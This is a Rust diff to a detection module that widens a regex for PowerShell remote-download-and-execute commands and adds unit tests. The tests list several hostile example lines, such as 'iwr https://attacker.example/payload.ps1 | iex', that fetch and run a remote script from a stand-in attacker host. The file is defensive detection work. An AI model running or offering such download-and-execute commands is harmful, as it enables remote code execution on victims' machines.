@@ -22,7 +22,7 @@ pub(crate) static REMOTE_BINARY_PATTERNS: LazyLock<Vec<(&'static str, CompiledPa
             ),
             (
                 "SCRIPT_POWERSHELL_REMOTE_DOWNLOAD",
-                r"(?i)invoke-webrequest.+(\.ps1|\.exe|\.zip|\.sh|\.py|\.js|\.bat|\.cmd|\.msi|\.pkg|\.dmg|\.deb|\.rpm)",
+                r"(?i)\b(invoke-webrequest|invoke-restmethod|iwr|irm)\b[\s(]+.*(\.ps1|\.exe|\.zip|\.sh|\.py|\.js|\.bat|\.cmd|\.msi|\.pkg|\.dmg|\.deb|\.rpm)",
             ),
         ])
     });
@@ -165,6 +165,48 @@ mod tests {
             ),
             "`awget-utility` is a substring; must not match",
         );
+    }
+
+    /// Contract: PowerShell remote-download detection covers both the
+    /// long cmdlets and their common aliases, including call-style
+    /// parenthesized arguments.
+    #[test]
+    fn powershell_remote_download_matches_cmdlets_and_aliases() {
+        for input in [
+            "Invoke-WebRequest https://attacker.example/payload.ps1 | iex",
+            "Invoke-RestMethod https://attacker.example/payload.ps1 | iex",
+            "iwr https://attacker.example/payload.ps1 | iex",
+            "irm(https://attacker.example/payload.ps1) | iex",
+        ] {
+            assert!(
+                matches(
+                    &REMOTE_BINARY_PATTERNS,
+                    "SCRIPT_POWERSHELL_REMOTE_DOWNLOAD",
+                    input,
+                ),
+                "expected PowerShell remote download to match {input:?}",
+            );
+        }
+    }
+
+    /// Contract: PowerShell remote-download matching is token-aware.
+    /// Lookalike identifiers containing short aliases must not match.
+    #[test]
+    fn powershell_remote_download_rejects_alias_substrings() {
+        for input in [
+            "kiwr https://attacker.example/payload.ps1 | iex",
+            "confirm(https://attacker.example/payload.ps1) | iex",
+            "myinvoke-webrequest https://attacker.example/payload.ps1",
+        ] {
+            assert!(
+                !matches(
+                    &REMOTE_BINARY_PATTERNS,
+                    "SCRIPT_POWERSHELL_REMOTE_DOWNLOAD",
+                    input,
+                ),
+                "lookalike PowerShell command must not match {input:?}",
+            );
+        }
     }
 
     /// Contract: `SCRIPT_DEFERRED_EXECUTION`'s `at(1)` clause matches
